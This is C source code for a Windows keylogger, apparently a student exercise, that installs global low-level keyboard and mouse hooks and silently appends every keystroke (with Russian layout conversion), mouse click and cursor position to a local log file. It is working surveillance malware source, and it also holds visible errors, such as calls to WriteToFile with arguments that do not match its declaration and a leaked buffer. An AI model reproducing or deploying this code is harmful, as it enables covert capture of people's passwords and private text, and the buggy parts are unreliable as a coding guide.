#include <Windows.h>
#include <stdio.h>
#define PATH L"X:\\4 курс (Мухин)\\Windows Hook\\WindowsHook\\WindowsHook\\KeyLog.txt"
#define RUS 1049
#define ENG 1033
#define SIZE_STR 20

BOOL IsCaps(void);
LRESULT CALLBACK LogKey(int iCode, WPARAM wParam, LPARAM IParam);
VOID WriteToFile(LPWSTR wstr);
WCHAR EnToRus(char c);


LRESULT CALLBACK LogMouse(int iCode, WPARAM wParam, LPARAM IParam);
DWORD LKey = 0, RKey = 0, MouseWheel =0;

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR pCmdLine, int nCmdShow)
{
	HHOOK hHook = SetWindowsHookExW(WH_KEYBOARD_LL, LogKey, NULL, NULL);	
	HHOOK hHook1 = SetWindowsHookExW(WH_MOUSE_LL, LogMouse, NULL, NULL);
	MSG msg = { 0 };
	while (GetMessage(&msg, NULL, 0, 0))
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
	UnhookWindowsHookEx(hHook);	
	UnhookWindowsHookEx(hHook1);
	return 0;
}
BOOL IsCaps(void)
{
	//GetKeyState используется в основном для определения состояния нажатия системной кнопки
	//VK - Virtual Key
	// ^ - это XOR
	if ((GetKeyState(VK_CAPITAL) & 0x0001) != 0 ^ (GetKeyState(VK_SHIFT) & 0x8000) != 0)
		return TRUE;
	return FALSE;
}
LRESULT CALLBACK LogMouse(int iCode, WPARAM wParam, LPARAM IParam)
{
	

	if (wParam == 513) // Нажатие левой кнопкой мыши
	{
		
		LKey++;
		LPWSTR String = (LPWSTR)calloc(150, sizeof(WCHAR));
		swprintf(String, 150, L"Вы нажали левую кнопку мыши следующее количество раз: %d ", LKey);
		//MessageBox(NULL, String, L"Зафиксировано несанкционированное нажатие мыши", MB_OK);		
		WriteToFile(String);
		LPWSTR String1 = (LPWSTR)calloc(150, sizeof(WCHAR));
		GetDC(NULL);
		POINT p;
		GetCursorPos(&p);
		swprintf(String1, 150, L"x=%4ld y=%4ld\r", p.x, p.y);
		WriteToFile(String1,150, L"x=%4ld y=%4ld\r", p.x, p.y);		
		free(String);

		
	}
	if (wParam == 516) // Нажатие правой кнопкой мыши
	{
		RKey++;
		LPWSTR String = (LPWSTR)calloc(150, sizeof(WCHAR));
		swprintf(String, 150, L"Вы нажали правую кнопку мыши следующее количество раз: %d ", RKey);
		//MessageBox(NULL, String, L"Зафиксировано несанкционированное нажатие мыши", MB_OK);
		WriteToFile(String);
		LPWSTR String1 = (LPWSTR)calloc(150, sizeof(WCHAR));
		GetDC(NULL);
		POINT p;
		GetCursorPos(&p);
		swprintf(String1, 150, L"x=%4ld y=%4ld\r", p.x, p.y);
		WriteToFile(String1, 150, L"x=%4ld y=%4ld\r", p.x, p.y);
		free(String);
	}
	if (wParam == 519) //нажатие колеса
	{
		MouseWheel++;
		LPWSTR String = (LPWSTR)calloc(150, sizeof(WCHAR));
		swprintf(String, 150, L"Вы нажали нажатие колеса следующее количество раз: %d ", MouseWheel);
		//MessageBox(NULL, String, L"Зафиксировано несанкционированное нажатие мыши", MB_OK);
		WriteToFile(String);
		LPWSTR String1 = (LPWSTR)calloc(150, sizeof(WCHAR));
		GetDC(NULL);
		POINT p;
		GetCursorPos(&p);
		swprintf(String1, 150, L"x=%4ld y=%4ld\r", p.x, p.y);
		WriteToFile(String1, 150, L"x=%4ld y=%4ld\r", p.x, p.y);
		free(String);
	}
	if (wParam == 522) // Колеса верх и назад
	{
		MouseWheel++;
		LPWSTR String = (LPWSTR)calloc(150, sizeof(WCHAR));
		swprintf(String, 150, L"Вы верх и назад колеса следующее количество раз: %d ", MouseWheel);
		//MessageBox(NULL, String, L"Зафиксировано несанкционированное нажатие мыши", MB_OK);
		WriteToFile(String);
		LPWSTR String1 = (LPWSTR)calloc(150, sizeof(WCHAR));
		GetDC(NULL);
		POINT p;
		GetCursorPos(&p);
		swprintf(String1, 150, L"x=%4ld y=%4ld\r", p.x, p.y);
		WriteToFile(String1, 150, L"x=%4ld y=%4ld\r", p.x, p.y);
		free(String);
	}

	return CallNextHookEx(NULL, iCode, wParam, IParam);
}

LRESULT CALLBACK LogKey(int iCode, WPARAM wParam, LPARAM IParam)
{
	if (wParam == WM_KEYDOWN)
	{
		PKBDLLHOOKSTRUCT pHook = (PKBDLLHOOKSTRUCT)IParam;
		WORD KeyLayout = LOWORD(GetKeyboardLayout(GetWindowThreadProcessId(GetForegroundWindow(), 0)));
		DWORD iKey = MapVirtualKey(pHook->vkCode, NULL) << 16;
		if (!(pHook->vkCode <= 1 << 5)) //32
			iKey |= 0x1 << 24; // Задаём истину для 24 бита
		LPWSTR KeyString = (LPWSTR)calloc(SIZE_STR + 1, sizeof(WCHAR));
		GetKeyNameTextW(iKey, KeyString, SIZE_STR);
		if (wcslen(KeyString) > 1) //Если нажата не текстовая клавиша
		{
			WriteToFile(L"[");
			WriteToFile(KeyString);
			WriteToFile(L"]");
		}
		else
		{
			if (!IsCaps()) KeyString[0] = tolower(KeyString[0]);
			if (KeyLayout == ENG)
			{
				// Сюда будем писать код, если есть какие то спецсимволы на англиёской раскладке
				
			}
			if (KeyLayout == RUS)
			{
				KeyString[0] = EnToRus(KeyString[0]);
			}
			WriteToFile(KeyString);
		}
		free(KeyString);
	}
	return CallNextHookEx(NULL, iCode, wParam, IParam);
}

VOID WriteToFile(LPWSTR wstr)
{
	FILE* f = NULL;
	if (!_wfopen_s(&f, PATH, L"ab"))
	{
		fwrite(wstr, sizeof(WCHAR), wcslen(wstr), f);
		fclose(f);
	}
}
WCHAR EnToRus(WCHAR c)
{
	switch (c)
	{
	case L'`':
		return L'ё';
	case L'q':
		return L'й';
	case L'w':
		return L'ц';
	case L'e':
		return L'у';
	case L'r':
		return L'к';
	case L't':
		return L'е';
	case L'y':
		return L'н';
	case L'u':
		return L'г';
	case L'i':
		return L'ш';
	case L'o':
		return L'щ';
	case L'p':
		return L'з';
	case L'[':
		return L'х';
	case L']':
		return L'ъ';
	case L'a':
		return L'ф';
	case L's':
		return L'ы';
	case L'd':
		return L'в';
	case L'f':
		return L'а';
	case L'g':
		return L'п';
	case L'h':
		return L'р';
	case L'j':
		return L'о';
	case L'k':
		return L'л';
	case L'l':
		return L'д';
	case L';':
		return L'ж';
	case L' ':
		return L'э';
	case L'z':
		return L'я';
	case L'x':
		return L'ч';
	case L'c':
		return L'с';
	case L'v':
		return L'м';
	case L'b':
		return L'и';
	case L'n':
		return L'т';
	case L'm':
		return L'ь';
	case L',':
		return L'б';
	case L'.':
		return L'ю';
	case L'/':
		return L'.';
	default:
		return L' ';
	}
}